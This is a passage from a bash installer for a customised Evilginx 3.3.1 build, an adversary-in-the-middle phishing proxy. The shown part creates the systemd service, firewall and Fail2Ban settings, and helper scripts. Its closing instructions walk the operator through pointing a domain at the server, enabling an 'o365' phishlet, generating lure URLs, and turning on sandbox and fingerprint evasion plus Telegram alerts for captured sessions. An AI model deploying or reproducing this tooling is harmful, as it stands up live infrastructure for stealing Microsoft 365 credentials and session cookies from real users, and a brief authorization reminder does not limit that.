    cat > /etc/fail2ban/jail.d/sshd.conf << EOF
[sshd]
enabled = true
port = 22
filter = sshd
${F2B_LOGPATH}
${F2B_BACKEND}
maxretry = 3
bantime = 3600
findtime = 600
EOF
    
    log_success "Fail2Ban configured for SSH protection"
    
    systemctl enable fail2ban
    systemctl restart fail2ban
    
    log_success "Fail2Ban enabled and started"
}

create_systemd_service() {
    log_step "Step 9: Creating Systemd Service"
    
    cat > /etc/systemd/system/evilginx.service << EOF
[Unit]
Description=Evilginx 3.3.1 - Private Dev Edition
Documentation=https://github.com/kgretzky/evilginx2
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=$SERVICE_USER
Group=$SERVICE_USER
WorkingDirectory=$INSTALL_BASE
ExecStart=/usr/local/bin/evilginx -c $CONFIG_DIR
Restart=on-failure
RestartSec=10s
StandardOutput=journal
StandardError=journal
SyslogIdentifier=evilginx

# Security hardening (non-root service user)
PrivateTmp=true
ProtectSystem=strict
ProtectHome=read-only
ReadWritePaths=$CONFIG_DIR $LOG_DIR $INSTALL_BASE
NoNewPrivileges=false

# Capabilities needed for binding to ports 53, 80, 443
AmbientCapabilities=CAP_NET_BIND_SERVICE
CapabilityBoundingSet=CAP_NET_BIND_SERVICE

# Resource limits
LimitNOFILE=65535
LimitNPROC=4096

[Install]
WantedBy=multi-user.target
EOF
    
    log_success "Systemd service file created"
    
    # Reload systemd
    systemctl daemon-reload
    log_success "Systemd daemon reloaded"
    
    # Enable service
    systemctl enable evilginx.service
    log_success "Evilginx service enabled for automatic startup"
}

configure_capabilities() {
    log_step "Step 10: Setting Binary Capabilities"
    
    # Allow binding to privileged ports
    log_info "Setting CAP_NET_BIND_SERVICE capability on binary..."
    setcap 'cap_net_bind_service=+ep' "$INSTALL_BASE/evilginx.bin"
    
    log_success "Binary can now bind to ports 53, 80, 443"
}

create_helper_scripts() {
    log_step "Step 11: Creating Helper Scripts"
    
    # Create start script (root check instead of redundant sudo)
    cat > /usr/local/bin/evilginx-start << 'EOF'
#!/bin/bash
if [[ $EUID -ne 0 ]]; then echo "Run as root: sudo $0"; exit 1; fi
systemctl start evilginx
systemctl status evilginx --no-pager
EOF
    chmod +x /usr/local/bin/evilginx-start
    
    # Create stop script
    cat > /usr/local/bin/evilginx-stop << 'EOF'
#!/bin/bash
if [[ $EUID -ne 0 ]]; then echo "Run as root: sudo $0"; exit 1; fi
systemctl stop evilginx
echo "Evilginx stopped"
EOF
    chmod +x /usr/local/bin/evilginx-stop
    
    # Create restart script
    cat > /usr/local/bin/evilginx-restart << 'EOF'
#!/bin/bash
if [[ $EUID -ne 0 ]]; then echo "Run as root: sudo $0"; exit 1; fi
systemctl restart evilginx
systemctl status evilginx --no-pager
EOF
    chmod +x /usr/local/bin/evilginx-restart
    
    # Create status script
    cat > /usr/local/bin/evilginx-status << 'EOF'
#!/bin/bash
if [[ $EUID -ne 0 ]]; then echo "Run as root: sudo $0"; exit 1; fi
systemctl status evilginx --no-pager -l
EOF
    chmod +x /usr/local/bin/evilginx-status
    
    # Create logs script
    cat > /usr/local/bin/evilginx-logs << 'EOF'
#!/bin/bash
if [[ $EUID -ne 0 ]]; then echo "Run as root: sudo $0"; exit 1; fi
journalctl -u evilginx -f
EOF
    chmod +x /usr/local/bin/evilginx-logs
    
    # Create console script
    cat > /usr/local/bin/evilginx-console << 'EOF'
#!/bin/bash
if [[ $EUID -ne 0 ]]; then echo "Run as root: sudo $0"; exit 1; fi
echo "Stopping systemd service to run interactively..."
systemctl stop evilginx
echo ""
echo "Starting Evilginx in interactive mode..."
echo "Press Ctrl+C to stop, then run 'evilginx-start' to resume service mode"
echo ""
evilginx -c /etc/evilginx
EOF
    chmod +x /usr/local/bin/evilginx-console
    
    log_success "Helper scripts created in /usr/local/bin/"
}

display_completion() {
    echo ""
    echo -e "${GREEN}╔═══════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                                                                   ║${NC}"
    echo -e "${GREEN}║          ✓ INSTALLATION COMPLETED SUCCESSFULLY!                  ║${NC}"
    echo -e "${GREEN}║                                                                   ║${NC}"
    echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    log_step "Installation Summary"
    
    echo -e "${CYAN}Installation Details:${NC}"
    echo "  • OS:                   $OS $VER ($GO_ARCH)"
    echo "  • Evilginx Binary:      /usr/local/bin/evilginx (wrapper)"
    echo "  • Actual Binary:        $INSTALL_BASE/evilginx.bin"
    echo "  • Phishlets Directory:  $PHISHLETS_DIR"
    echo "  • Redirectors Directory: $REDIRECTORS_DIR"
    echo "  • Configuration:        $CONFIG_DIR"
    echo "  • Logs:                 $LOG_DIR"
    echo "  • Running as:           Admin (root)"
    echo "  • Systemd Service:      evilginx.service"
    if [[ -n "$INSTALL_LOG" ]]; then
        echo "  • Install Log:          $INSTALL_LOG"
    fi
    echo ""
    
    echo -e "${CYAN}Firewall Rules (UFW):${NC}"
    echo "  • Port 22/tcp  - SSH (allow)"
    echo "  • Port 53/tcp  - DNS (allow)"
    echo "  • Port 53/udp  - DNS (allow)"
    echo "  • Port 80/tcp  - HTTP (allow)"
    echo "  • Port 443/tcp - HTTPS (allow)"
    echo ""
    
    echo -e "${CYAN}Quick Usage:${NC}"
    echo "  • sudo evilginx         - Run with default paths (phishlets & redirectors included)"
    echo "  • sudo evilginx -debug  - Run in debug mode"
    echo "  • sudo evilginx -developer - Run in developer mode"
    echo ""
    echo "  ${GREEN}No need to specify -p or -t flags anymore!${NC}"
    echo ""
    
    echo -e "${CYAN}Available Commands:${NC}"
    echo "  • evilginx-start        - Start Evilginx service"
    echo "  • evilginx-stop         - Stop Evilginx service"
    echo "  • evilginx-restart      - Restart Evilginx service"
    echo "  • evilginx-status       - Check service status"
    echo "  • evilginx-logs         - View live logs"
    echo "  • evilginx-console      - Run interactive console"
    echo ""
    
    echo -e "${CYAN}Systemd Commands:${NC}"
    echo "  • systemctl start evilginx    - Start service"
    echo "  • systemctl stop evilginx     - Stop service"
    echo "  • systemctl restart evilginx  - Restart service"
    echo "  • systemctl status evilginx   - Check status"
    echo "  • journalctl -u evilginx -f   - View logs"
    echo ""
    
    echo -e "${YELLOW}⚠️  IMPORTANT: Next Steps${NC}"
    echo ""
    echo "1. Configure Evilginx before starting:"
    echo "   Run: evilginx-console"
    echo ""
    echo "2. In the Evilginx console, configure:"
    echo "   config domain yourdomain.com"
    echo "   config ipv4 external $(curl -s ifconfig.me 2>/dev/null || echo '<YOUR_IP>')"
    echo "   config autocert on"
    echo "   config lure_strategy realistic"
    echo ""
    echo "3. Enable a phishlet:"
    echo "   phishlets hostname o365 login.yourdomain.com"
    echo "   phishlets enable o365"
    echo ""
    echo "4. Create a lure:"
    echo "   lures create o365"
    echo "   lures get-url 0"
    echo ""
    echo "5. Exit console (Ctrl+C) and start service:"
    echo "   evilginx-start"
    echo ""
    
    echo -e "${YELLOW}⚠️  SECURITY REMINDERS${NC}"
    echo ""
    echo "  • Ensure you have WRITTEN AUTHORIZATION"
    echo "  • Configure Cloudflare DNS for your domain"
    echo "  • Enable advanced features (ML, JA3, Sandbox detection)"
    echo "  • Set up Telegram notifications for monitoring"
    echo "  • Review DEPLOYMENT_GUIDE.md for complete setup"
    echo "  • Check logs regularly: journalctl -u evilginx -f"
    echo ""
    
    echo -e "${GREEN}Documentation:${NC}"
    echo "  • Main Guide:           /opt/evilginx/DEPLOYMENT_GUIDE.md"
    echo "  • Session Formatting:   /opt/evilginx/SESSION_FORMATTING_GUIDE.md (NEW!)"
    echo "  • Linux VPS Setup:      /opt/evilginx/LINUX_VPS_SETUP.md"
    echo "  • Best Practices:       /opt/evilginx/BEST_PRACTICES.md"
    echo "  • README:               /opt/evilginx/README.md"
    echo ""
    
    echo -e "${CYAN}Quick Start:${NC}"
    echo "  1. sudo evilginx        # Run with auto-loaded paths"
    echo "  2. <configure settings> # Set domain, IP, phishlets"
    echo "  3. exit or Ctrl+C       # Exit console"
    echo "  4. evilginx-start       # Start service"
    echo "  5. evilginx-status      # Verify running"
    echo ""
    
    echo -e "${CYAN}Environment:${NC}"
    echo "  • Go installed at:      /usr/local/go"
    echo "  • Go PATH via:          /etc/profile.d/golang.sh"
    echo "  • Verify with:          go version"
    echo ""
    
    echo -e "${GREEN}═══════════════════════════════════════════════════════════${NC}"
    echo ""
    
    # Remind about PATH
    echo -e "${YELLOW}Note:${NC} Go has been added to PATH. You may need to reload your shell or run:"
    echo "  source /etc/profile.d/golang.sh"
    echo ""
}

#############################################################################
# Usage / Help
#############################################################################

show_usage() {
    echo "Evilginx 3.3.1 - One-Click Installer (v3.0.0)"
    echo ""
    echo "Usage: sudo $0 [OPTION]"
    echo ""
    echo "Options:"
    echo "  (none)       Full installation (default)"
    echo "  --upgrade    Rebuild and reinstall binary only (skip deps/firewall/service)"
    echo "  --uninstall  Remove Evilginx (binary, service, scripts, optionally config)"
    echo "  --dry-run    Show what would be done without making changes"
    echo "  --help, -h   Show this help message"
    echo ""
    echo "Examples:"
    echo "  sudo ./install.sh              # Full install on fresh server"
    echo "  sudo ./install.sh --upgrade    # Quick rebuild after code changes"
    echo "  sudo ./install.sh --uninstall  # Clean removal"
    echo "  ./install.sh --dry-run         # Preview (no root needed)"
    echo ""
}

#############################################################################
# Main Installation Flow
#############################################################################

main() {
    # Set up install logging — tee all output to a log file
    INSTALL_LOG="/tmp/evilginx-install-$(date +%Y%m%d_%H%M%S).log"
    exec > >(tee -a "$INSTALL_LOG") 2>&1
    log_info "Installation log: $INSTALL_LOG"
    
    print_banner
    
    # Pre-flight: ensure git is available
    ensure_git
    
    # Find Evilginx root directory using consolidated search
    EVILGINX_ROOT=$(find_evilginx_root) || true
    if [[ -n "$EVILGINX_ROOT" ]]; then
        cd "$EVILGINX_ROOT"
        log_info "Working directory: $(pwd)"
    else
        log_error "Cannot find Evilginx root directory with main.go"
        log_error "Searched: $SCRIPT_DIR, $(pwd), $HOME/Evilginx3, /root/Evilginx3"
        exit 1
    fi
    
    # Pre-installation checks
    check_root
    detect_os
    confirm_installation
    
    # Pre-flight connectivity and resource checks
    preflight_check
    
    # Installation steps
    update_system
    install_dependencies
    install_go
    create_service_user
    setup_directories
    stop_conflicting_services
    disable_systemd_resolved
    build_evilginx
    configure_firewall
    configure_fail2ban
    create_systemd_service
    configure_capabilities
    create_helper_scripts
    create_admin_user
    
    # Completion
    display_completion
    
    log_success "Installation complete! Review the information above."
    log_success "Full log saved to: $INSTALL_LOG"
}

#############################################################################
# Argument Parsing & Entry Point
#############################################################################

case "${1:-}" in
    --help|-h)
        show_usage
        exit 0
        ;;
    --uninstall)
        check_root
        print_banner
        uninstall_evilginx
        exit 0
        ;;
    --upgrade)
        check_root
        print_banner
        detect_os

        log_step "Upgrade Mode — Rebuilding and reinstalling binary only"

        INSTALL_LOG="/tmp/evilginx-upgrade-$(date +%Y%m%d_%H%M%S).log"
        exec > >(tee -a "$INSTALL_LOG") 2>&1
        log_info "Upgrade log: $INSTALL_LOG"

        EVILGINX_ROOT=$(find_evilginx_root) || true
        if [[ -z "$EVILGINX_ROOT" ]]; then
            log_error "Cannot find Evilginx root directory with main.go"
            log_error "Searched: $SCRIPT_DIR, $(pwd), $HOME/Evilginx3, /root/Evilginx3"
            exit 1
        fi
        cd "$EVILGINX_ROOT"
        log_info "Working directory: $(pwd)"

        stop_conflicting_services
        build_evilginx
        configure_capabilities

        log_info "Restarting Evilginx service..."
        systemctl restart evilginx 2>/dev/null || log_warning "Service not started (run 'evilginx-console' to configure first)"

        log_success "Upgrade complete!"
        log_success "Full log saved to: $INSTALL_LOG"
        exit 0
        ;;
    --dry-run)
        print_banner

        # Detect OS for display (doesn't require root)
        if [ -f /etc/os-release ]; then
            . /etc/os-release
            OS=$NAME
            VER=$VERSION_ID
        fi

        echo ""
        log_info "DRY RUN — The following steps would be executed:"
        echo ""
        echo "   1.  Update system packages (apt-get update)"
        echo "   2.  Install dependencies (~20 packages: curl, wget, ufw, fail2ban, etc.)"
        echo "   3.  Install Go $GO_VERSION ($GO_ARCH) from go.dev"
        echo "   4.  Create directories: $CONFIG_DIR, $LOG_DIR"
        echo "   5.  Stop conflicting services (apache2, nginx, bind9, systemd-resolved)"
        echo "   6.  Disable systemd-resolved (free port 53)"
        echo "   7.  Build Evilginx from source"
        echo "   8.  Install binary + phishlets to: $INSTALL_BASE"
        echo "   9.  Configure UFW firewall (ports 22, 53, 80, 443)"
        echo "  10.  Configure Fail2Ban (SSH protection)"
        echo "  11.  Create systemd service: evilginx.service"
        echo "  12.  Set binary capabilities (CAP_NET_BIND_SERVICE)"
        echo "  13.  Create helper scripts (evilginx-{start,stop,restart,status,logs,console})"
        echo ""
        log_info "No changes were made."
        echo ""
        echo "To perform actual installation, run:"
        echo "  sudo ./install.sh"
        echo ""
        exit 0
        ;;
    "")
        # Default: full installation
        main
        ;;
    *)
        log_error "Unknown option: $1"
        show_usage
        exit 1
        ;;
esac

exit 0
